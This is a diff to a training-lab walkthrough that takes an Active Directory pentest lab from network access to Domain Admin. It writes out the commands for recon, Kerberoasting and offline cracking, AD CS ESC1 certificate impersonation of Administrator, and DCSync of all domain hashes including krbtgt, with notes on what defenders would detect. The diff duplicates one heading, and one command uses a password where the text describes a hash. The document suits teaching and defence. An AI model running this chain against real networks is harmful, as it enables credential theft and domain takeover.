@@ -3,6 +3,7 @@
 **Lab:** Active Directory Pentest Lab (`labs/security/ad-pentest/`)
 **Lab version:** 1.9
 **Network:** 172.28.128.0/24 (`lab.local`)
+**Full reference:** See [`attack-guide.md`](attack-guide.md) for comprehensive technique coverage and alternative attack paths.
 
 This is a narrative walkthrough of one complete path from an unauthenticated
 foothold to Domain Admin, using nothing but the credentials and access
@@ -23,32 +24,53 @@ For blue-team detections mapped to these exact techniques, see
 
 ## The environment
 
-Fourteen hosts, one domain, `lab.local`. The three that matter for this
-chain:
+Fourteen hosts, one domain, `lab.local`:
 
-| Host | IP | Role |
-|------|----|------|
-| dc01 | 172.28.128.21 | Domain Controller (Windows Server 2022) |
-| ca01-esc | 172.28.128.24 | AD CS — issues certificates, misconfigured |
-| kali | 172.28.128.10 | Attacker box |
+| Host | IP | OS | Role |
+|------|----|----|------|
+| kali | 172.28.128.10 | Kali Linux | Attacker box (your position) |
+| metasploitable2 | 172.28.128.12 | Ubuntu 8.04 | Legacy vulnerable target |
+| juice-shop | 172.28.128.15 | Node.js | OWASP Juice Shop |
+| dc01 | 172.28.128.21 | Windows Server 2022 | Domain Controller |
+| db01 | 172.28.128.23 | Windows Server 2019 | SQL Server |
+| ca01-esc | 172.28.128.24 | Windows Server 2022 | AD CS — misconfigured |
+| win10 | 172.28.128.30 | Windows 10 | Domain workstation |
+| pnpt-internal | 172.28.128.50 | Ubuntu 22.04 | Internal server |
+| llm01 | 172.28.128.60 | Ubuntu 22.04 | LLM platform |
+| exch01 | 172.28.128.70 | Windows Server 2019 | Exchange |
+| sp01 | 172.28.128.71 | Windows Server 2019 | SharePoint |
+| linux01 | 172.28.128.72 | Ubuntu 22.04 | Linux domain member |
+| print01 | 172.28.128.73 | Windows Server 2019 | Print Server |
+| cloud-pentest | 172.28.128.80 | Ubuntu 22.04 | LocalStack AWS simulation |
 
-Starting position: no domain credentials, only network access.
+**Starting position:** no domain credentials, only network access from kali.
+**Attack chain focus:** dc01, ca01-esc, and win10.
 
 ---
 
 ## Phase 1 — Recon: find out what's actually alive
 
+## Phase 1 — Recon: find out what's actually alive
+
 ```bash
+# Host sweep
 nmap -sn 172.28.128.0/24 -oN ~/lab/recon/hosts.txt
+
+# Service discovery on key hosts and full scan of DC
 nmap -sV -sC -T4 --top-ports 500 172.28.128.0/24 -oN ~/lab/recon/services.txt
+nmap -p- --min-rate 2000 172.28.128.21 -oN ~/lab/recon/dc01_full.txt
+
+# Enumerate SMB and DNS
+nxc smb 172.28.128.0/24 --gen-relay-list ~/lab/recon/relay_targets.txt
 dig axfr @172.28.128.21 lab.local | tee ~/lab/recon/dns_zonetransfer.txt
+dnsrecon -d lab.local -n 172.28.128.21 -a -z -o ~/lab/recon/dnsrecon.txt
 ```
 
 The host sweep confirms the domain controller at `.21` and the CA at `.24`.
 A DNS zone transfer attempt against `dc01` is free reconnaissance if it's
 allowed — it hands over the entire internal namespace without a single
-credential. (In this lab it's intentionally permitted so the technique can
-be practiced; a hardened DC would refuse it.)
+credential. (In this lab it's intentionally permitted; a hardened DC would
+refuse it.)
 
 **What a defender would see:** a single source IP sweeping the full /24
 followed by a zone transfer request is loud and specific — Zeek or Suricata
@@ -70,6 +92,8 @@ bloodhound-python \
   -ns 172.28.128.21 \
   -c All \
   -o ~/lab/recon/bloodhound/
+
+# Load the output into BloodHound Neo4j instance to visualize paths
 ```
 
 Loading this into BloodHound surfaces the same thing a real assessment
@@ -93,11 +117,13 @@ service account's own password hash, which can be cracked offline with no
 further contact against the DC.
 
 ```bash
+# Request all Kerberoastable service tickets
 GetUserSPNs.py lab.local/vagrant:Vagrant123! \
   -dc-ip 172.28.128.21 \
   -request \
   -outputfile ~/lab/creds/kerberoast.hashes
 
+# Crack the hashes offline (or target the specific account)
 hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
   /usr/share/wordlists/rockyou.txt \
   -o ~/lab/creds/kerberoast_cracked.txt
@@ -126,9 +152,11 @@ window from one workstation — Event ID 4769 with RC4 encryption
 The CA at `ca01-esc` publishes a certificate template (`VulnESC1`) that lets
 a low-privilege enrollee specify an arbitrary Subject Alternative Name —
 meaning any domain user can request a certificate *as if they were the
-Administrator account*, and AD CS will happily sign it.
+Administrator account*, and AD CS will happily sign it. Now that we have
+`svc_kerberoast`'s credentials, we can use them for this escalation:
 
 ```bash
+# Enumerate vulnerable templates on ca01-esc
 certipy find \
   -u svc_kerberoast@lab.local \
   -p 'ServiceP@ss2' \
@@ -136,6 +164,7 @@ certipy find \
   -vulnerable \
   -stdout | tee ~/lab/adcs/vulnerable_templates.txt
 
+# Request a cert for Administrator using the VulnESC1 template
 certipy req \
   -u svc_kerberoast@lab.local \
   -p 'ServiceP@ss2' \
@@ -145,6 +174,7 @@ certipy req \
   -upn administrator@lab.local \
   -out ~/lab/adcs/esc1_admin.pfx
 
+# Authenticate as Administrator using the cert to get their NT hash
 certipy auth \
   -pfx ~/lab/adcs/esc1_admin.pfx \
   -dc-ip 172.28.128.21
@@ -170,11 +200,17 @@ With Administrator's NT hash in hand, pull every credential in the domain
 directly from `dc01` by abusing replication permissions:
 
 ```bash
+# Pull all domain secrets using Administrator's hash
+secretsdump.py \
+  'lab.local/administrator:Passw0rd!'@172.28.128.21
+
+# Or output to a file for analysis, NTLM hashes only
 secretsdump.py \
   'lab.local/administrator:Passw0rd!'@172.28.128.21 \
   -just-dc-ntlm \
   -outputfile ~/lab/loot/dcsync.hashes
 
+# Extract the krbtgt hash (Kerberos master key)
 grep krbtgt ~/lab/loot/dcsync.hashes
 ```
 
